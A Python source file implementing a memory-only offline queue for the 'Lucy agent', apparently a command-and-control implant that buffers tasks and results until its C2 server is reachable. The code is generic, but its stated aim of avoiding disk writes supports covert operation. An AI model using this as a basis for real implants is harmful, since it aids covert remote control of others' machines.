"""
Offline queue for the Lucy agent.

Stores task results and received tasks in memory only. When the C2 is
reachable, queued items are flushed automatically. When disconnected, the
agent can continue executing tasks and reporting will resume on reconnect.

This implementation is intentionally memory-only: no disk writes.
"""
import logging
import threading
from collections import deque
from typing import Callable, Optional

logger = logging.getLogger("lucy_agent")

DEFAULT_MAX_RESULTS = 500
DEFAULT_MAX_TASKS = 100


class OfflineQueue:
    """Thread-safe in-memory queue for offline operation."""

    def __init__(
        self,
        max_results: int = DEFAULT_MAX_RESULTS,
        max_tasks: int = DEFAULT_MAX_TASKS,
    ):
        self._results: deque[dict] = deque()
        self._tasks: deque[dict] = deque()
        self._max_results = max_results
        self._max_tasks = max_tasks
        self._lock = threading.Lock()

    def enqueue_result(self, result: dict) -> None:
        """Store a task result to be sent when the C2 is back online."""
        with self._lock:
            if len(self._results) >= self._max_results:
                self._results.popleft()
                logger.warning("Offline result queue overflow — dropped oldest item")
            self._results.append(result)

    def enqueue_task(self, task: dict) -> None:
        """Store a received task that could not be executed while offline."""
        with self._lock:
            if len(self._tasks) >= self._max_tasks:
                self._tasks.popleft()
                logger.warning("Offline task queue overflow — dropped oldest item")
            self._tasks.append(task)

    def dequeue_result(self) -> Optional[dict]:
        with self._lock:
            return self._results.popleft() if self._results else None

    def dequeue_task(self) -> Optional[dict]:
        with self._lock:
            return self._tasks.popleft() if self._tasks else None

    def peek_results(self, limit: int = 10) -> list[dict]:
        with self._lock:
            return list(self._results)[:limit]

    def peek_tasks(self, limit: int = 10) -> list[dict]:
        with self._lock:
            return list(self._tasks)[:limit]

    def result_count(self) -> int:
        with self._lock:
            return len(self._results)

    def task_count(self) -> int:
        with self._lock:
            return len(self._tasks)

    def clear(self) -> None:
        with self._lock:
            self._results.clear()
            self._tasks.clear()

    def flush_results(self, send_fn: Callable[[dict], None]) -> int:
        """Send all queued results using the provided function. Returns sent count."""
        sent = 0
        while True:
            result = self.dequeue_result()
            if result is None:
                break
            try:
                send_fn(result)
                sent += 1
            except Exception as exc:
                logger.warning("Failed to flush queued result: %s", exc)
                with self._lock:
                    self._results.appendleft(result)
                break
        return sent
